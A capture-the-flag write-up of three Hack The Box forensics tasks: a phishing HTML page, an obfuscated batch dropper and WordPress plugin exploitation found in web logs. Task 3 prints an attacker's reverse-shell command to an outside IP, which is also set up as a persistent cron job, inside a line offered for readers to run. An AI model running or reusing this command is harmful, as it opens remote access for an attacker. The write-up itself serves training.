# Task 1: Spooky Phishing
Question: A few citizens of the Spooky Country have been victims of a targeted phishing campaign. Inspired by the Halloween spirit, none of them was able to detect attackers trap. Can you analyze the malicious attachment and find the URL for the next attack stage?

Flag: `HTB{sp00ky_ph1sh1ng_w1th_sp00ky_spr34dsh33ts}`

We are given the following file:
* `index.html`: HTML page containing the phishing mechanism.

Analyzing the source code, several encoded codes cane be identified in the tags highlighted.

![phishing1](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/1666ccad-4bf5-44bf-9589-e6d1740d82fa)

Let us start analyzing the `<script>` tag in HTML is used to include JavaScript code in a web page. 
1. `data`: - This specifies that the URL is a data URI. 
2. `text/javascript;base64`: - This part of the URL indicates that the data is encoded as Base64 and represents `JavaScript` code.

Hence, the whole section can be decoded from Base64 and the script code can then be analyzed further.

![phishing2](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/1d141eed-f3f9-43a8-beb5-68442c9baffa)

Notice how the script initiates two variables, `nn` and `aa`. These variables contain the result of the `decodeHex` function given the two hidden values as parameter each time, after the result of the `atob` function (atob decodes data that has been encoded with base64). 

![phishing3](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/02f2d840-8370-4073-a19c-d30d0dd6f6a2)

One way is to analyze the `decodeHex` function. By concatenating the two hidden strings in the html file and decoding it with Base64 first and then hex, the flag can be retrieved.

![phishing4](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/61292495-bd0a-44f2-b61e-28baf9658ece)

Another way is to just enter the website as it will redirect us to an error page with the flag present in its URL. However, this was just an error from HTB after getting confirmation from a HTB staff on Discord.

![phishing5](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/b53a02cc-f233-49cf-add4-51b69a782d3b)

![phishing6](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/9af66095-5825-4d1f-be28-05b5a727cba0)

# Task 2: Bat Problems
Question: On a chilly Halloween night, the town of Hollowville was shrouded in a veil of mystery. The infamous "Haunted Hollow House", known for its supernatural tales, concealed a cryptic document. Whispers in the town suggested that the one who could solve its riddle would reveal a beacon of hope. As an investigator, your mission is to decipher the script's enigmatic sorcery, break the curse, and unveil the flag to become Hollowville's savior.

Flag: `HTB{0bfusc4t3d_b4t_f1l3s_c4n_b3_4_m3ss}`

We are given the following file:
* `payload.bat`: Malicious bat file.

As we can see from the following image, the script contains random variables that are assigned with random values. In a batch script (a .bat or .cmd file), the set command defines and manipulates environment variables which store information that can be used by the script or other programs running in the same environment (the Command Prompt session).

![bat](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/0fd21a7a-8f4c-46c9-a985-1570a57f694c)

First, the bat file can be analyzed using `Any.Run` which is a malware analyzer tool.
We will get the following result if we upload the sample on the aforementioned site.

![bat2](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/0e1c32ed-4f98-4d8b-8f06-350efa1761e3)

By analyzing the behavior graph, we notice three actions made:
1. The attacker can be seen using `cmd` to copy PowerShell to a different path with a random name (Earttxmxaqr.png). 
1. The attacker then uses cmd again to rename the downloaded bat file and also change it's extension to `.png.bat` to avoid detection.
1. The attacker executes the base64 encoded string using the renamed PowerShell executable (`-enc` argument in Powershell is used to pass a base64 encoded command).

![bat3](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/66bc25ac-e13b-427b-917c-b51767202b0b)

By decoding the string, the flag can be retrieved.

![bat4](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/ff75d596-8d18-4edc-ad2d-925625bd205d)

# Task 3: Vulnerable Season
Question: Halloween season is a very busy season for all of us. Especially for web page administrators. Too many Halloween-themed parties to attend, too many plugins to manage. Unfortunately, our admin didn't update the plugins used by our WordPress site and as a result, we got pwned. Can you help us investigate the incident by analyzing the web server logs?

Flag: `HTB{L0g_@n4ly5t_4_bEg1nN3r}`

We are given the following file:
* `access.log`: Wordpress server logs.

In the log file, notice there are several requests related to a WordPress website. Analyzing the logs, `82.179.92.206` has performed the most requests out of the IP addresses, indicating a suspicious activity. So we can find the amount of times an IP addresses was involved by the number of requests.
```
cat access.log | cut -d " " -f 1 | sort | uniq -c
```

![vul](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/c8fa44b3-133d-4df6-b276-c06c98c9778d)

By reading the instructions, they mentioned that the attacker may have exploited a vulnerability in a plugin. 
Hence, the search can be easier by filtering the logs using "wp-content/plugins/" which is the directory storing all the plugins. Requests from 82.179.92.206 with response status code of 200 are the key to identifying the vulnerability, as these can reveal whether the attacker's attempts were successful. 

By analyzing the logs, notice how some requests suggest that the attacker has exploited the `wp-upg` plugin since the plugin was responding with 200 OK messages. Additionally, `wp-upg` has certain vulnerabilities such as CVE-2022-4060 and CVE-2023-0039

![vul2](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/e0aac332-d852-458d-a5b6-39ac78ff7369)

After identifying the vulnerable plugin, the logs are analyzed further and another important log was found. These requests indicate the attacker was attempting to execute arbitrary commands on the system.

![vul3](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/9a45e2a9-b710-48e1-b087-f62fd4dc2986)

One of the requests creates a cron job named `testconnect` that connects to a Command and Control (CnC) server and prints the flag.

![vul4](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/ccbeef90-e54d-42ba-b1e9-66a5a2495552)

![vul5](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/d26940c4-9311-499f-9468-c29b2b5b990f)

At this point, I was stuck and required help from the HTB writeup. I found out that to retrieve the flag was to decode the URL using the `testconnect` cron job again. This can be done using the command:

```
echo "sh -i >& /dev/tcp/82.179.92.206/7331 0>&1" > /etc/cron.daily/testconnect && Nz=Eg1n;az=5bDRuQ;Mz=fXIzTm;Kz=F9nMEx;Oz=7QlRI;Tz=4xZ0Vi;Vz=XzRfdDV;echo $Mz$Tz$Vz$az$Kz$Oz|base64 -d|rev
```

![vul6](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/a9bbfa96-a62f-49aa-8d85-7ba1410c8684)
